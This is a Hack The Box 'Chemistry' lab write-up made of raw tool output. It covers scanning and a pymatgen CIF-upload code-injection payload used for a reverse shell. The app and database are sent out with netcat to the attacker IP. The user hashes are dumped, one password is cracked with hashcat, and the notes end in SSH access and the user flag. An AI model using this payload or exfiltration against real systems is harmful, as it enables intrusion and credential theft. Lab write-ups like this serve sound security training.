nmap output:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 04:51 CDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:51
Completed NSE at 04:51, 0.00s elapsed
Initiating NSE at 04:51
Completed NSE at 04:51, 0.00s elapsed
Initiating NSE at 04:51
Completed NSE at 04:51, 0.00s elapsed
Initiating Ping Scan at 04:51
Scanning chemistry.htb (10.129.231.141) [4 ports]
Completed Ping Scan at 04:51, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 04:51
Scanning chemistry.htb (10.129.231.141) [1000 ports]
Discovered open port 22/tcp on 10.129.231.141
Discovered open port 5000/tcp on 10.129.231.141
Completed SYN Stealth Scan at 04:51, 0.58s elapsed (1000 total ports)
Initiating Service scan at 04:51
Scanning 2 services on chemistry.htb (10.129.231.141)
Completed Service scan at 04:53, 92.73s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against chemistry.htb (10.129.231.141)
Retrying OS detection (try #2) against chemistry.htb (10.129.231.141)
Retrying OS detection (try #3) against chemistry.htb (10.129.231.141)
Retrying OS detection (try #4) against chemistry.htb (10.129.231.141)
Retrying OS detection (try #5) against chemistry.htb (10.129.231.141)
Initiating Traceroute at 04:53
Completed Traceroute at 04:53, 0.04s elapsed
Initiating Parallel DNS resolution of 1 host. at 04:53
Completed Parallel DNS resolution of 1 host. at 04:53, 0.00s elapsed
NSE: Script scanning 10.129.231.141.
Initiating NSE at 04:53
Completed NSE at 04:53, 1.09s elapsed
Initiating NSE at 04:53
Completed NSE at 04:53, 1.05s elapsed
Initiating NSE at 04:53
Completed NSE at 04:53, 0.00s elapsed
Nmap scan report for chemistry.htb (10.129.231.141)
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 02 Nov 2024 09:51:52 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=11/2%Time=6725F636%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Sat,\x2002\x20Nov\x202024\x2009:51:52\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/2%OT=22%CT=1%CU=44030%PV=Y%DS=2%DC=T%G=Y%TM=6725
OS:F69A%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=FF%GCD=2%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST1
OS:1NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 19.393 days (since Sun Oct 13 19:28:02 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   34.33 ms 10.10.14.1
2   34.42 ms chemistry.htb (10.129.231.141)

NSE: Script Post-scanning.
Initiating NSE at 04:53
Completed NSE at 04:53, 0.00s elapsed
Initiating NSE at 04:53
Completed NSE at 04:53, 0.00s elapsed
Initiating NSE at 04:53
Completed NSE at 04:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.58 seconds
           Raw packets sent: 1124 (53.442KB) | Rcvd: 1777 (137.563KB)

```

dirb output:
```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb_output.txt
START_TIME: Sat Nov  2 04:52:58 2024
URL_BASE: http://chemistry.htb:5000/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://chemistry.htb:5000/ ----
+ http://chemistry.htb:5000/dashboard (CODE:302|SIZE:235)                                                                                                         
+ http://chemistry.htb:5000/login (CODE:200|SIZE:926)                                                                                                             
+ http://chemistry.htb:5000/logout (CODE:302|SIZE:229)                                                                                                            
+ http://chemistry.htb:5000/register (CODE:200|SIZE:931)                                                                                                          
+ http://chemistry.htb:5000/upload (CODE:405|SIZE:153)                                                                                                            
                                                                                                                                                                  
-----------------
END_TIME: Sat Nov  2 04:59:29 2024
DOWNLOADED: 4612 - FOUND: 5
```

nikto output:

```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.231.141
+ Target Hostname:    chemistry.htb
+ Target Port:        5000
+ Start Time:         2024-11-02 04:55:21 (GMT-5)
---------------------------------------------------------------------------
+ Server: Werkzeug/3.0.3 Python/3.9.5
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Python/3.9.5 appears to be outdated (current is at least 3.9.6).
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET .
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7962 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-11-02 05:06:37 (GMT-5) (676 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

CIF file pymatgen exploit: `https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f`

Payload for Burp Intruder:
```
POST /upload HTTP/1.1
Host: 10.129.240.196:5000
Content-Length: 921
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.240.196:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySae1pZqkTTUyVRUq
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.240.196:5000/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwljjEOwzAIAP_iuQMQwHE-EwEGtWvSTFX_3kjdbjjp7tP2OvJ8tu19XPlo-2u2rengqRhFGEYgMgw5w4MTTVcDtzJZMpQXGlyZSDrKR_c-pt--MGCoQ05wHgk3rI7UqdhShLUYtE8oU6-Mu8GFnQJEKzq1e-Q68_jfoLTvDyEGL-k.Zza6Qw.IkfQZhXeS8bf_PK78pSjXu2f2Fo
Connection: close

------WebKitFormBoundarySae1pZqkTTUyVRUq
Content-Disposition: form-data; name="file"; filename="§payload1§.cif"
Content-Type: application/octet-stream

data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("§payload2§");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
------WebKitFormBoundarySae1pZqkTTUyVRUq--
```

reverse shell:
```bash
┌─[us-dedivip-1]─[10.10.14.34]─[bhugo97@htb-dnumvgyfxy]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.34] from (UNKNOWN) [10.129.2.140] 45054
whoami
app
ls -lah
total 52K    
drwxr-xr-x    8 app      app         4.0K Oct  9 20:18 .
drwxr-xr-x    4 root     root        4.0K Jun 16 23:10 ..
lrwxrwxrwx    1 root     root           9 Jun 17 01:51 .bash_history -> /dev/null
-rw-r--r--    1 app      app          220 Jun 15 20:43 .bash_logout
-rw-r--r--    1 app      app         3.7K Jun 15 20:43 .bashrc
drwxrwxr-x    3 app      app         4.0K Jun 17 00:44 .cache
drwx------    7 app      app         4.0K Jun 15 22:57 .local
-rw-r--r--    1 app      app          807 Jun 15 20:43 .profile
lrwxrwxrwx    1 root     root           9 Jun 17 01:52 .sqlite_history -> /dev/null
-rw-------    1 app      app         5.7K Oct  9 20:08 app.py
drwx------    2 app      app         4.0K Nov 15 04:18 instance
drwx------    2 app      app         4.0K Oct  9 20:13 static
drwx------    2 app      app         4.0K Oct  9 20:18 templates
drwx------    2 app      app         4.0K Nov 15 04:18 uploads
pwd
/home/app

```

send app and db over with netcat for further analysis:
```bash
cat app.py | nc 10.10.14.34 4444
cat instance/database.db | nc 10.10.14.34 4444
```

database content:
```bash
sqlite> .tables
structure  user     
sqlite> .schema
CREATE TABLE structure (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        filename VARCHAR(150) NOT NULL,
        identifier VARCHAR(100) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (identifier)
);
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
);
sqlite> SELECT * FROM user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|test|098f6bcd4621d373cade4e832627b4f6
```

app content:
```bash
..........
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
..........
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if User.query.filter_by(username=username).first():
            flash('Username already exists.')
            return redirect(url_for('register'))
        hashed_password = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        login_user(new_user)
        return redirect(url_for('dashboard'))
    return render_template('register.html')
..........
```

hashcat output:
```bash
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
Time.Started.....: Fri Nov 15 00:41:52 2024 (0 secs)
Time.Estimated...: Fri Nov 15 00:41:52 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  4907.2 kH/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2983936/14344385 (20.80%)
Rejected.........: 0/2983936 (0.00%)
Restore.Point....: 2981888/14344385 (20.79%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: unicornn -> underwear88
```

user flag:
```bash
s┌─[us-dedivip-1]─[10.10.14.34]─[bhugo97@htb-dnumvgyfxy]─[~]
└──╼ [★]$ ssh rosa@chemistry.htb
rosa@chemistry.htb's password: 
..............................
rosa@chemistry:~$ ls -lah
total 36K
drwxr-xr-x 5 rosa rosa 4.0K Jun 17 01:51 .
drwxr-xr-x 4 root root 4.0K Jun 16 23:10 ..
lrwxrwxrwx 1 root root    9 Jun 17 01:50 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rosa rosa 3.7K Feb 25  2020 .bashrc
drwx------ 2 rosa rosa 4.0K Jun 15 20:38 .cache
drwxrwxr-x 4 rosa rosa 4.0K Jun 16 16:04 .local
-rw-r--r-- 1 rosa rosa  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Jun 17 01:51 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa 4.0K Jun 15 18:24 .ssh
-rw-r--r-- 1 rosa rosa    0 Jun 15 20:43 .sudo_as_admin_successful
-rw-r----- 1 root rosa   33 Nov 15 04:16 user.txt
rosa@chemistry:~$ cat user.txt 
408f5a80b52155617f9811f34acc605a
```

linPEAS output:
```bash
..............................
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
..............................

╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
..............................
root        1037  0.0  1.4 110192 28948 ?        Ssl  04:15   0:04 /usr/bin/python3.9 /opt/monitoring_site/app.py
```

proxy port 8080 website:
![image](https://github.com/user-attachments/assets/19bf4724-4ac2-4fcd-a7ac-2a1bb4352090)

gobuster output (port 8080):
```bash
/assets               (Status: 403) [Size: 14]
/.                    (Status: 200) [Size: 5971]
/..                   (Status: 200) [Size: 5971]
/?adjust_t=           (Status: 200) [Size: 5971]
/?fnf=fnf             (Status: 200) [Size: 5971]
/?Publisher           (Status: 200) [Size: 5971]
/?wp-cs-dump          (Status: 200) [Size: 5971]
/?wp-html-rend        (Status: 200) [Size: 5971]
/?wp-start-ver        (Status: 200) [Size: 5971]
/?wp-stop-ver         (Status: 200) [Size: 5971]
/?wp-uncheckout       (Status: 200) [Size: 5971]
/?wp-usr-prop         (Status: 200) [Size: 5971]
/?wp-ver-diff         (Status: 200) [Size: 5971]
/?wp-verify-link      (Status: 200) [Size: 5971]
/?wp-ver-info         (Status: 200) [Size: 5971]
/?Open                (Status: 200) [Size: 5971]
/?OpenServer          (Status: 200) [Size: 5971]
/?D=A                 (Status: 200) [Size: 5971]
/?M=A                 (Status: 200) [Size: 5971]
/?N=D                 (Status: 200) [Size: 5971]
/?PageServices        (Status: 200) [Size: 5971]
/?S=A                 (Status: 200) [Size: 5971]
/?\"><script>alert('Vulnerable');</script> (Status: 200) [Size: 5971]
/?mod=<script>alert(document.cookie)</script>&op=browse (Status: 200) [Size: 5971]
/?mod=node&nid=some_thing&op=view (Status: 200) [Size: 5971]
/?mod=some_thing&op=browse (Status: 200) [Size: 5971]
/?pattern=/etc/*&sort=name (Status: 200) [Size: 5971]
/?sql_debug=1         (Status: 200) [Size: 5971]
/scripts/slxweb.dll/getfile?type=Library&file=[invalid filename] (Status: 400) [Size: 572]
/?query_term=path%3a/&pre=<1337abcdef>&post=yyyy (Status: 200) [Size: 5971]
```

whatweb output (port 8080):
```bash
WhatWeb report for http://chemistry.htb:4444
Status    : 200 OK
Title     : Site Monitoring
IP        : 10.129.2.140
Country   : RESERVED, ZZ

Summary   : HTML5, HTTPServer[BaseHTTP/0.6 Python/3.8.10, Python/3.9 aiohttp/3.9.1], JQuery[3.6.0], Matomo, Python[3.9], Script
```

aiohttp cve: https://github.com/advisories/GHSA-5h86-8mv2-jq9f
